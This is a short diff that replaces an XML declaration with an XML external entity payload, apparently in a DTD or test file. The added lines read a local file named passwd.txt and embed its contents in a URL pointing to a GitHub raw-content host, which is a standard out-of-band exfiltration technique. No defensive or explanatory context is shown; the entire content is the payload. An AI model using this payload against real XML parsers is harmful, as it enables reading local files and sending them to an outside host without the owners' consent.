@@ -1,1 +1,4 @@
-<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///C:\Users\ranjeeth.rajendran\Sketch\workspace8.1\t\xml/passwd.txt">
+<!ENTITY % eval "<!ENTITY test SYSTEM 'https://raw.githubusercontent.com/ranjee/util/main/%file;'>">
+%eval;
+<!ENTITY rd '%file;'>
